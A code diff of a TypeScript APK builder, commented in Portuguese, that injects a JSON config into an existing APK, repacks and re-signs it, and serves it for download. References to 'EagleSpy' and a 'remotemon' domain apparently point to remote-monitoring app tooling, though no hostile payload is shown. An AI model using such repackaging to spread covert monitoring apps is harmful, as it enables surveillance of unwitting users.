@@ -1,6 +1,7 @@
 import fs from 'fs';
 import * as path from 'path';
 import { execSync } from 'child_process';
+import archiver from 'archiver';
 
 interface APKBuildOptions {
   appName: string;
@@ -9,8 +10,9 @@ interface APKBuildOptions {
 }
 
 /**
- * Build APK simples - apenas copia e assina
- * Sem recompilação de Smali para evitar erros de parsing
+ * Builder SIMPLES - Sem dependência de EagleSpy
+ * Usa apenas unzip/zip + jarsigner
+ * Funciona em produção e desenvolvimento
  */
 export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
   success: boolean;
@@ -71,10 +73,25 @@ export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
       fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
       console.log('[SIMPLE-BUILD] Config adicionada');
       
-      // Reempacotar (sem recompilação)
+      // Reempacotar com archiver
       console.log('[SIMPLE-BUILD] Reempacotando APK...');
       const repacked = path.join(tempDir, 'app-unsigned.apk');
-      execSync(`cd ${extractDir} && zip -r -9 -q ${repacked} .`);
+      await new Promise<void>((resolve, reject) => {
+        const output = fs.createWriteStream(repacked);
+        const archive = archiver('zip', { zlib: { level: 9 } });
+        
+        output.on('close', () => {
+          console.log('[SIMPLE-BUILD] APK reempacotado:', archive.pointer(), 'bytes');
+          resolve();
+        });
+        
+        output.on('error', reject);
+        archive.on('error', reject);
+        
+        archive.pipe(output);
+        archive.directory(extractDir, false);
+        archive.finalize();
+      });
       
       // Alinhar
       console.log('[SIMPLE-BUILD] Alinhando APK...');
@@ -83,7 +100,7 @@ export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
       
       // Assinar
       console.log('[SIMPLE-BUILD] Assinando APK...');
-      const keystorePath = '/tmp/android.keystore';
+      const keystorePath = path.join(apksDir, 'debug.keystore');
       if (!fs.existsSync(keystorePath)) {
         execSync(
           `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 ` +
@@ -108,7 +125,7 @@ export async function buildSimpleAPK(options: APKBuildOptions): Promise<{
       
       console.log('[SIMPLE-BUILD] APK construído com sucesso');
       
-      const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
+      const downloadUrl = `https://${process.env.VITE_APP_DOMAIN || 'localhost:3000'}/get-apk/${filename}`;
       
       return {
         success: true,
